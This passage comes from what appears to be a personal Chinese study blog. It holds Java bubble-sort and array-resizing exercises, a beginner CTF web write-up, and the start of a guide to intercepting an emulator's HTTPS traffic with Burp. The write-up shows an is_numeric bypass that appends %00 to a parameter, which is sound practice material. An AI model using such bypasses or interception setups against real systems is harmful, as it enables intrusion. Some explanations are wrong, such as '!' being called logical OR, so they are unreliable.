外层排序次数最多有5层，相当于：6-1=5(6为数组的大小)规律2 内层交换的次数最大有5次，也是相当于6-1=5，不过略有不同：    第1次排序  6-1=5次     第2次排序  6-2=4次     第3次排序  6-3=3次     第4次排序  6-4=2次     第5次排序  6-5=1次  =&gt;这么明显的for循环……    ==&gt; 整体上外层依次递增，内层依次递减规律3 递减和递增的范围都不会超出[1,数组大小/数组长度-1]。规律4 每一次外循环确定一个最大数，导致每次内层循环的次数减少。规律5 前面大于后面则两数交换。</code></pre><p>最终的冒排序Java版本代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BubbleSort</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 目的：实现冒泡排序算法，为了效果，写个数组进行排序</span></span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">557</span>,<span class="number">45</span>,<span class="number">24</span>,<span class="number">69</span>,<span class="number">80</span>,<span class="number">57</span>,<span class="number">13</span>,-<span class="number">333</span>,<span class="number">451</span>,-<span class="number">90</span>,<span class="number">8741</span>,<span class="number">9999</span>&#125;;</span><br><span class="line">        System.out.println(<span class="string">&quot;the length:&quot;</span>+arr.length);</span><br><span class="line">        <span class="comment">// 外循环，[1,5)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;arr.length;i++ ) &#123;</span><br><span class="line">            <span class="comment">// 交换印记：负责记录是否交换</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 内循环，[1,5-i+1)</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;arr.length-i+<span class="number">1</span> ;j++ ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr[j-<span class="number">1</span>]&gt;arr[j]) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> arr[j];</span><br><span class="line">                    arr[j] = arr[j-<span class="number">1</span>];</span><br><span class="line">                    arr[j-<span class="number">1</span>] = num;</span><br><span class="line">                    flag += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> ix=<span class="number">0</span>;ix&lt;arr.length ;ix++ ) &#123;</span><br><span class="line">            System.out.print(arr[ix]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(<span class="string">&quot;\t &quot;</span>+i+<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            <span class="comment">// 如果交换印记生效，证明交换已经停止，退出当前循环。</span></span><br><span class="line">            <span class="keyword">if</span> (flag&lt;=<span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;输出最终冒泡排序结果:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr.length ;i++ ) &#123;</span><br><span class="line">            System.out.print(arr[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，它是个小范围灵活的程序，可以为数组灵活的扩充或者缩减元素，它会返回正确的排序效果。</p><p>最近任务重，但不在Java（狗头保命）</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习日志-07</title>
      <link href="/2023/02/07/java-study-07/"/>
      <url>/2023/02/07/java-study-07/</url>
      
        <content type="html"><![CDATA[<h1 id="题目概要"><a href="#题目概要" class="headerlink" title="题目概要"></a>题目概要</h1><p>这次的目标略微简单些，是一道关于老师讲的题目。因为有了些其他的见解，做了些拓展。下面先亮一下题：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这是一个数列，请为数列扩容：</span></span><br><span class="line"><span class="comment">// &#123;1,3,4,6&#125;</span></span><br></pre></td></tr></table></figure><span id="more"></span><p>基于当前的学习情况来讲，我没有学过任何类似于__Python__那种能直接__add元素__的方法，那么我要怎么做才能扩容呢？</p><p>答案很简单，只需要再 __创一个数组__，然后 <strong>嫁接</strong> 过去就可以了。(类似于<code>数组=新数组</code>,调用相同的内存地址,原先初始数组的赋值就被废弃了.)</p><p>但……这只是老师的想法啊……</p><h1 id="我的思考"><a href="#我的思考" class="headerlink" title="我的思考"></a>我的思考</h1><p>我的目标：实现数组的增删，且基于当下的条件，适时再引入一些其他的东西（毕竟学过其他语言，不能浪费了）。</p><p>整体思路如下：<br>0.创建一个初始数组</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">arr_Initial</span> <span class="operator">=</span> &#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>&#125;;</span><br></pre></td></tr></table></figure><p><strong>1</strong>.创建一个接收器，接收是要进行 <strong>增/删/阅读/退出</strong> 的哪一项：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">myScanner</span> <span class="operator">=</span> Scanner(System.in);</span><br><span class="line"><span class="comment">// 打印出所有的数据</span></span><br><span class="line">System.out.print(<span class="string">&quot;数组的原始数据为：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr_Initial;i++)&#123;</span><br><span class="line">    System.out.print(arr_Initial[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 从这个注释的地方开始，装个while(true)&#123;&#125;囊括下面所有的代码，包括分支语句那部分</span></span><br><span class="line">System.out.println(<span class="string">&quot;请问您要进行哪类操作？&quot;</span>);</span><br><span class="line">System.out.print(<span class="string">&quot;增/删/阅/退=&gt;a/k/r/n ：&quot;</span>);</span><br><span class="line"><span class="comment">// 获取确定的选择</span></span><br><span class="line"><span class="type">char</span> <span class="variable">chars</span> <span class="operator">=</span> myScanner.next().charAt(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 创建一个临时整形变量</span></span><br><span class="line"><span class="type">int</span> num;</span><br><span class="line"><span class="comment">// 创建一个临时整形变量,存储初始数组的大小.</span></span><br><span class="line"><span class="type">int</span> <span class="variable">num_l</span> <span class="operator">=</span> arr_Initial.length;</span><br><span class="line"><span class="comment">// 下面衔上分支语句</span></span><br></pre></td></tr></table></figure><p><strong>2</strong>.使用条件判断进行状态区分，总计有5个分支语句，如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(chars==<span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 增加数组的元素的模块</span></span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (chars==<span class="string">&#x27;k&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 减少数组的元素的模块</span></span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (chars==<span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 读取初始数组元素的模块</span></span><br><span class="line">    System.out.println(<span class="string">&quot;当前数组的所有元素为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num_l;i++)&#123;</span><br><span class="line">        System.out.print(arr_Initial+<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (chars==<span class="string">&#x27;n&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 退出循环模的模块</span></span><br><span class="line">    System.out.print(<span class="string">&quot;退出当前循环！下列是当前数组的所有元素：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num_l;i++)&#123;</span><br><span class="line">        System.out.print(arr_Initial+<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;您的输入不符合条件，请重新输入！&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增模块与减模块较大，分别独立出来讲。</p><h1 id="“增”模块"><a href="#“增”模块" class="headerlink" title="“增”模块"></a>“增”模块</h1><p>增模块的大体思路是：</p><p><strong>1</strong>.获取要增加的数组有多少，赋值给 <strong>num</strong>.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.print(<span class="string">&quot;请输入增加元素的个数：&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> myScanner.nextInt();</span><br></pre></td></tr></table></figure><p><strong>2</strong>.创建临时数组 __new_arr__，大小为初始数组大小+<strong>arr_Initial.length</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] new_arr = <span class="keyword">new</span> <span class="title class_">int</span>[num+num_l];</span><br></pre></td></tr></table></figure><p><strong>3</strong>.按个读取初始数组的全部元素，按位赋值给临时数组。这样临时数组就具备了初始数组的所有元素，下一步可以 <strong>重塑</strong> 初始数组了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num_l;i++)&#123;</span><br><span class="line">    new_arr[i]=arr_Initial[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>4</strong>.重塑初始数组的大小，只需要 <strong>new一下</strong> 就可以了，再使用for循环赋值回来就行了。这就是我理解的实质性的扩充数组的方式。</p><p>原本在这一步之前有一步<code>arr_Initial=null</code>的步骤的，观察其对结果没什么影响，故省略不计。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">arr_Initial = <span class="keyword">new</span> <span class="title class_">int</span>[new_arr.length];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;new_arr.length;i++)&#123;</span><br><span class="line">    arr_Initial[i]=new_arr[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 垃圾回收，免得占内存</span></span><br><span class="line">new_arr = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p><strong>5</strong>.接收新的数组元素，使用 __for循环接收__。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num;i++) &#123;</span><br><span class="line">    System.out.print(<span class="string">&quot;请输入要添加的第&quot;</span>+(i+<span class="number">1</span>)+<span class="string">&quot;个元素：&quot;</span>);</span><br><span class="line">    arr_Initial[num_l+i] = myScanner.nextInt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单完成了 __“增”模块__，接下来处理下 __“减”模块__。</p><h1 id="“减”模块"><a href="#“减”模块" class="headerlink" title="“减”模块"></a>“减”模块</h1><p>这个模块更简单，和增模块一样，有一个类似的 __减容模块__，下面具体实际操作下。</p><p><strong>1</strong>.获取 <strong>降容数</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;注意！删除的方式是直接从数组末尾减去对应个数的元素！&quot;</span>);</span><br><span class="line">System.out.print(<span class="string">&quot;请输入删除元素的个数：&quot;</span>);</span><br><span class="line">num = myScanner.nextInt();</span><br></pre></td></tr></table></figure><p><strong>2</strong>.转换降容数，并且创建为 __临时数组__。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">num = arr_Initial.length-num;</span><br><span class="line"><span class="keyword">if</span>(num&lt;<span class="number">0</span>) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;降容过低！拒绝降容！&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 总容量-降容数=最终缩小容量</span></span><br><span class="line"><span class="type">int</span>[] del_arr = <span class="keyword">new</span> <span class="title class_">int</span>[num_l-num];</span><br></pre></td></tr></table></figure><p><strong>3</strong>.临时的数组复制初始数组的部分元素值，并且对初始数组降容。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;del_arr.length;i++) &#123;</span><br><span class="line">    del_arr[i] = arr_Initial[i];</span><br><span class="line">&#125;</span><br><span class="line">arr_Initial = <span class="keyword">new</span> <span class="title class_">int</span>[del_arr.length];</span><br></pre></td></tr></table></figure><p><strong>4</strong>.数组重塑降容后，将临时数组的值返还给初始数组，并且赋 <strong>null</strong> 准备回收。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr_Initial.length;i++)&#123;</span><br><span class="line">    arr_Initial[i]=del_arr[i];</span><br><span class="line">&#125;</span><br><span class="line">del_arr = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><h1 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h1><p>接下来，只需要稍做处理，将所有的代码 <strong>合并</strong> 即可。下面是合并的所有代码。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">word02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">myScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span>[] arr_Initial = &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span> &#125;;</span><br><span class="line">        <span class="comment">// 打印出所有的数据</span></span><br><span class="line">        System.out.print(<span class="string">&quot;数组的原始数据为：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;arr_Initial.length;i++)&#123;</span><br><span class="line">            System.out.print(arr_Initial[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 无限循环</span></span><br><span class="line">        <span class="type">int</span> num;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请问您要进行哪类操作？&quot;</span>);</span><br><span class="line">            System.out.print(<span class="string">&quot;增/删/阅/退=&gt;a/k/r/n ：&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取确定的状态</span></span><br><span class="line">            <span class="type">char</span> <span class="variable">chars_yn</span> <span class="operator">=</span> myScanner.next().charAt(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 创建一个临时整形变量</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">num_l</span> <span class="operator">=</span> arr_Initial.length;</span><br><span class="line">            <span class="keyword">if</span> (chars_yn==<span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">                </span><br><span class="line">                    <span class="comment">// 增加数组的元素的模块</span></span><br><span class="line">                    System.out.print(<span class="string">&quot;请输入增加元素的个数：&quot;</span>);</span><br><span class="line">                    num = myScanner.nextInt();</span><br><span class="line">                    <span class="comment">// 获取初始数组的大小</span></span><br><span class="line">                    <span class="comment">// int num_l = arr_Initial.length;</span></span><br><span class="line">                    <span class="comment">// 创建临时数组</span></span><br><span class="line">                    <span class="type">int</span>[] new_arr = <span class="keyword">new</span> <span class="title class_">int</span>[num+num_l];</span><br><span class="line">                    <span class="comment">// 复制初始数组到临时数组</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num_l;i++)&#123;</span><br><span class="line">                        new_arr[i]=arr_Initial[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                    arr_Initial = <span class="keyword">new</span> <span class="title class_">int</span>[new_arr.length];</span><br><span class="line">                    <span class="comment">// 将临时数组值复制回去</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;new_arr.length;i++)&#123;</span><br><span class="line">                        arr_Initial[i]=new_arr[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 垃圾回收，免得占内存</span></span><br><span class="line">                    new_arr = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num;i++) &#123;</span><br><span class="line">                        System.out.print(<span class="string">&quot;请输入要添加的第&quot;</span>+(i+<span class="number">1</span>)+<span class="string">&quot;个元素：&quot;</span>);</span><br><span class="line">                        arr_Initial[num_l+i] = myScanner.nextInt();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(chars_yn==<span class="string">&#x27;k&#x27;</span>) &#123;</span><br><span class="line">                    <span class="comment">// 减少数组的元素的模块</span></span><br><span class="line">                    System.out.print(<span class="string">&quot;请输入需要减少的元素个数:&quot;</span>);</span><br><span class="line">                    <span class="comment">// 获取数目:</span></span><br><span class="line">                    num = myScanner.nextInt();</span><br><span class="line">                    <span class="comment">// 原始数组大小</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 计算大小是否合法</span></span><br><span class="line">                    <span class="keyword">if</span>(arr_Initial.length-num&lt;<span class="number">0</span>) &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;降容过低！拒绝降容！&quot;</span>);</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 总容量-降容数=最终缩小容量</span></span><br><span class="line">                    <span class="type">int</span>[] del_arr = <span class="keyword">new</span> <span class="title class_">int</span>[num_l-num];</span><br><span class="line">                    <span class="comment">// 复制部分初始数组元素</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;del_arr.length;i++) &#123;</span><br><span class="line">                        del_arr[i] = arr_Initial[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 格式化初始数组容量</span></span><br><span class="line">                    arr_Initial = <span class="keyword">new</span> <span class="title class_">int</span>[del_arr.length];</span><br><span class="line">                    <span class="comment">// 将临时数组返还给初始数组</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr_Initial.length;i++)&#123;</span><br><span class="line">                        arr_Initial[i]=del_arr[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 格式化清除</span></span><br><span class="line">                    del_arr = <span class="literal">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (chars_yn==<span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">                    <span class="comment">// 读取初始数组元素的模块</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;当前数组的大小为：&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr_Initial.length;i++)&#123;</span><br><span class="line">                        System.out.print(arr_Initial[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (chars_yn==<span class="string">&#x27;n&#x27;</span>) &#123;</span><br><span class="line">                    <span class="comment">// 退出循环模的模块</span></span><br><span class="line">                    System.out.print(<span class="string">&quot;退出当前循环！下列是当前数组的所有元素：&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr_Initial.length;i++)&#123;</span><br><span class="line">                        System.out.print(arr_Initial[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>; </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;您的输入不符合条件，请重新输入！&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个的思维其实很简单,一小时不到就敲出来了.关键是家里一直吵吵嚷嚷的,很影响学习的效率(那响度啊,受不鸟受不鸟…算是被逼过来写博客了…正好把思路梳理下.).</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web日志-001</title>
      <link href="/2023/02/06/ctf-web-001/"/>
      <url>/2023/02/06/ctf-web-001/</url>
      
        <content type="html"><![CDATA[<p>题目取自于<a href="https://ctf.bugku.com/challenges/detail/id/70.html">bugku</a></p><p>题型web，隔了那么长时间没看，bugku居然放了那么多道基础的题目？？？长见识了长见识了……</p><span id="more"></span><h1 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h1><h2 id="取题："><a href="#取题：" class="headerlink" title="取题："></a>取题：</h2><!-- !["第一题题目"](web_001.png) --><p><img src="https://raw.githubusercontent.com/linxiao-wangchuan/Data_warehouse_blog/main/box/2023/ctf-web-001/web_001.png" alt="&quot;第一题题目&quot;"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/ctf-web-001/web_002.png?raw=true" alt="&quot;第一题题目&quot;"></p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>题目给出的提示很明显，需要一个Get，我们直接在URL框框内赋值一个get变量就行。具体的如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13409/?what=flag</span><br></pre></td></tr></table></figure><p>下面是最终的结果，得到flag：<br><img src="https://raw.githubusercontent.com/linxiao-wangchuan/Data_warehouse_blog/main/box/2023/ctf-web-001/web_003.png" alt="&quot;第一题题目&quot;"><br><img src="https://raw.githubusercontent.com/linxiao-wangchuan/Data_warehouse_blog/main/box/2023/ctf-web-001/web_004.png" alt="&quot;第1题题目&quot;"></p><h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><p>这里涉及的知识点不多，相比之前看天书一样的感觉真的是太简单了……<br>知识点仅仅需要会get传参就行，剩下就是简单的把参数调整正确就能出结果了。</p><h1 id="简单说一下两道题目"><a href="#简单说一下两道题目" class="headerlink" title="简单说一下两道题目"></a>简单说一下两道题目</h1><p>一道题目是“滑稽”，只需要打开F12键查看下代码注释就可以得到。</p><p>另一道就是“计算器”，只需要打开F12键，查看下调试器的js文件就能看到，里面有一个明显的“echo flag{*******}”（*号代flag，自己去看吧，我省点硬币……）</p><p>下面是成功完成的界面。</p><p><img src="https://raw.githubusercontent.com/linxiao-wangchuan/Data_warehouse_blog/main/box/2023/ctf-web-001/web_006.png" alt="&quot;第3题题目&quot;"><br><img src="https://raw.githubusercontent.com/linxiao-wangchuan/Data_warehouse_blog/main/box/2023/ctf-web-001/web_005.png" alt="&quot;第3题题目&quot;"></p><h1 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h1><h2 id="取题：-1"><a href="#取题：-1" class="headerlink" title="取题："></a>取题：</h2><p><img src="https://raw.githubusercontent.com/linxiao-wangchuan/Data_warehouse_blog/main/box/2023/ctf-web-001/web_008.png" alt="&quot;第4题题目&quot;"><br><img src="https://raw.githubusercontent.com/linxiao-wangchuan/Data_warehouse_blog/main/box/2023/ctf-web-001/web_009.png" alt="&quot;第4题题目&quot;"></p><h2 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h2><p>题目给出的信息为post，说明要使用post传参。题目和get一样，将指定的值传给参数what，再通过post提交。</p><p>这里需要用到一个工具：Max HackBar，具体怎么安装有时间再讲。</p><p>下面就是传参的效果了，直接得到flag：</p><p><img src="https://raw.githubusercontent.com/linxiao-wangchuan/Data_warehouse_blog/main/box/2023/ctf-web-001/web_010.png" alt="&quot;第4题题目&quot;"><br><img src="https://raw.githubusercontent.com/linxiao-wangchuan/Data_warehouse_blog/main/box/2023/ctf-web-001/web_011.png" alt="&quot;第4题题目&quot;"></p><h1 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h1><h2 id="得题"><a href="#得题" class="headerlink" title="得题"></a>得题</h2><p><img src="https://raw.githubusercontent.com/linxiao-wangchuan/Data_warehouse_blog/main/box/2023/ctf-web-001/web_012.png" alt="&quot;第5题题目&quot;"><br><img src="https://raw.githubusercontent.com/linxiao-wangchuan/Data_warehouse_blog/main/box/2023/ctf-web-001/web_013.png" alt="&quot;第5题题目&quot;"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>第一个直觉是绕过。绕过学得不怎么扎实，先分析下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]; <span class="comment">// 获取get传参的值</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>)) <span class="comment">// 单分支if判断，is_numeric是一个php函数，&quot;!&quot;是逻辑&#x27;或&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">1</span>) <span class="comment">// 判断变量是不是1，是则输出flag</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>综上所述，flag的必要条件就是num必须等于1.</p><p>但不得不考虑的是，num在is_numeric时就已经将数字过滤掉了。那么怎么将参数传进去呢？</p><p>必须绕过is_numeric，把数字1传进去。</p><p>这里引用一个大佬的博客文章做参考<a href="https://blog.csdn.net/weixin_50597969/article/details/115492810">is_numeric函数的绕过</a>，使用空格“%00”作为绕过条件，is_numeric会判断,因为空格存在，判断时直接跳过，保留下数字进行后面的<code>if($num==1) </code>的判断。</p><p>下面直接实际演示：<br><img src="https://raw.githubusercontent.com/linxiao-wangchuan/Data_warehouse_blog/main/box/2023/ctf-web-001/web_014.png" alt="&quot;第5题题目&quot;"><br><img src="https://raw.githubusercontent.com/linxiao-wangchuan/Data_warehouse_blog/main/box/2023/ctf-web-001/web_015.png" alt="&quot;第5题题目&quot;"></p><p>接下来继续学习喽（时间真打紧呐……）~</p>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逍遥模拟器https抓包</title>
      <link href="/2023/02/06/SEC-Study-0001/"/>
      <url>/2023/02/06/SEC-Study-0001/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨天听课时，看着老师做实践，上手一实验就出来了风险报警，怪奇特的……<br>逍遥模拟器的抓包在老版本好像能使用bp直接抓取，但今天试验了下，好像已经不行了，需要特殊的办法导入证书才行。不然会有访问的警告爆出，不能像拦截http那样直接拦截https并操作。</p><!-- （下图爆出的错误就是没配置好导致的） --><h1 id="准备配置"><a href="#准备配置" class="headerlink" title="准备配置"></a>准备配置</h1><blockquote><p><strong>重点！</strong> Windows11系统蓝BP可能行不通！<br>之前测试了一早上都不能拦截https，安装测试完全没问题，重启后那台手机模拟器的网络还被ban了……<br>后来思来想去，排除了安装配置的问题，指向的问题就只剩下一个：系统。<br><span style="color:red"> <strong>换到Windows10！换到Windows10！换到Windows10！</strong> </span><br>当前测试成功拦截https的数据报的是Windows10下的橙BP，目前橙BP版本是v2.0的。</p></blockquote><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>为了将https拦截，我们需要两样东西：<br>1.OpenSSL：转文件用的<br>2.adb：连接安卓模拟器并且写入数据用的</p><span id="more"></span><p>因为主要目的是拦截https，OpenSSL和adb我们只看功能，其他不赘述。</p><h2 id="开始配置"><a href="#开始配置" class="headerlink" title="开始配置"></a>开始配置</h2><h3 id="配置手机模拟器和burp的代理"><a href="#配置手机模拟器和burp的代理" class="headerlink" title="配置手机模拟器和burp的代理"></a>配置手机模拟器和burp的代理</h3><p>首先，打开逍遥模拟器对应的手机，打开WiFi并且 <strong>长按</strong> WiFi的标志修改网络的代理，操作如下图<br>（注意！一定要鼠标长按！点击出来和长按出来的结果是不一样的！）<br><img src="sec_01.png" alt="&quot;修改模拟器网络代理&quot;"></p><p>打开Burp，按下图进行操作：<br><img src="sec_02.png" alt="&quot;修改burp的代理&quot;"></p><h3 id="设置共享文件夹"><a href="#设置共享文件夹" class="headerlink" title="设置共享文件夹"></a>设置共享文件夹</h3><p>为了后续操作方便，打开模拟器，设置下共享文件夹，并且把需要的证书下载了。<br><img src="sec_03.png" alt="&quot;配置共享文件夹及下载证书&quot;"></p><h3 id="下载安装OpenSSL及adb"><a href="#下载安装OpenSSL及adb" class="headerlink" 